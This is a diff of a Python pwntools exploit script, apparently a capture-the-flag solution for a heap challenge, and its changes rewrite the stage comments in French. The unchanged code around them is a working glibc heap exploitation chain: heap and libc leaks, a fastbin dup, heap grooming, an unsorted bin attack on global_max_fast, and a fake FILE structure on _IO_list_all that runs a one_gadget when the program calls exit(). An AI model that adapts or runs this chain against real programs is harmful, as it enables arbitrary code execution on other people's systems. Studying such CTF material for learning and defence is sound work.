@@ -108,7 +108,7 @@ def nbytes(hdrs, fill=b'A'):
     return bytes(nm)
 
 def exploit(ovf_name):
-    # ---------- stage 1a: heap leak ----------
+    # ---------- Etape 1a : fuite du tas (le nom de 0x100 octets n'est pas termine par NUL) ----------
     nm = bytearray(b'A' * 0x100)
     nm[0xf0:0xf8] = p64(0); nm[0xf8:0x100] = p64(0x60)
     p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
@@ -127,14 +127,14 @@ def exploit(ovf_name):
     log.info("heap = %#x" % heap)
     reintro(nbytes({0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
 
-    # ---------- stage 1b: fastbin dup -> creams[] ----------
+    # ---------- Etape 1b : fastbin dup, le malloc rend 0x602130 donc creams[] est a nous ----------
     eat(0); eat(1); eat(0)
     buy(0x58, p64(FAKE_FAST))
     buy(0x58, b'D' * 0x58)
     buy(0x58, p64(0) + p64(0x61) + p64(FAKE_FAST) + b'E' * 0x40)
     buy(0x58, p64(0) * 2 + p64(FAKE_FAST) + p64(0x602050) + p64(0) * 7)
 
-    # ---------- stage 1c: libc leak ----------
+    # ---------- Etape 1c : fuite libc par le faux chunk unsorted dans name ----------
     reintro(nbytes({0x08: 0x91, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61,
                     0xf0: FAKE_FAST, 0xf8: 0x60}))
     eat(1)
@@ -174,7 +174,7 @@ def exploit(ovf_name):
         for i in range(9):
             creams[i] = vals[i]
 
-    # ---------- payload map for the groom chunks ----------
+    # ---------- plan des payloads de groom (decalage de 0xd0 par rapport au heap) ----------
     payloads = {}
     def put(addr, data):
         d = addr - heap
@@ -203,7 +203,7 @@ def exploit(ovf_name):
         for k in sorted(payloads):
             log.info("payload chunk %d: %s" % (k, bytes(payloads[k]).hex()))
 
-    # ---------- heap grooming ----------
+    # ---------- mise en place du tas : 8 chunks puis le chunk qui portera le faux FILE ----------
     made = 0
     while made < NCHUNK:
         free_low = [i for i in range(9) if creams[i] == 0]
@@ -221,14 +221,14 @@ def exploit(ovf_name):
         log.info("fake FILE fields: %r" % [hex(x) if x is not None else None for x in c])
         log.info("nextsize@%#x = %#x" % (heap + NEXTSZ_OFF, q(heap + NEXTSZ_OFF) or 0))
 
-    # ---------- final reset: creams[1] = C_f+0x10 ----------
+    # ---------- dernier reset : creams[1] pointe C_f + 0x10, la tete du faux FILE ----------
     reset(final=True)
     if pid:
         c = creams_now()
         log.info("creams = %r" % (c,))
         assert c[1] == heap + CF + 0x10
 
-    # ---------- stage 2a: global_max_fast = unsorted ----------
+    # ---------- Etape 2a : unsorted bin attack, bck->fd ecrase global_max_fast ----------
     reintro(nbytes({0x08: 0x91, 0x38: 0x91, 0x98: 0x21, 0xb8: 0x21,
                     0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
     eat(2)
@@ -241,13 +241,13 @@ def exploit(ovf_name):
     if pid:
         log.info("gmf = %#x (want %#x)" % (q(gmf) or 0, unsorted))
 
-    # ---------- stage 2b: free(C_f+0x10) -> _IO_list_all = C_f ----------
+    # ---------- Etape 2b : free(C_f+0x10), fastbinsY[319] tombe sur _IO_list_all ----------
     eat(1)
     if pid:
         log.info("_IO_list_all = %#x (want %#x)  alive=%r" %
                  (q(io_list) or 0, heap + CF, p.poll() is None))
 
-    # ---------- trigger exit ----------
+    # ---------- detente : exit() passe par _IO_flush_all_lockp et appelle notre one_gadget ----------
     p.send(b'4\n')
     return True
 
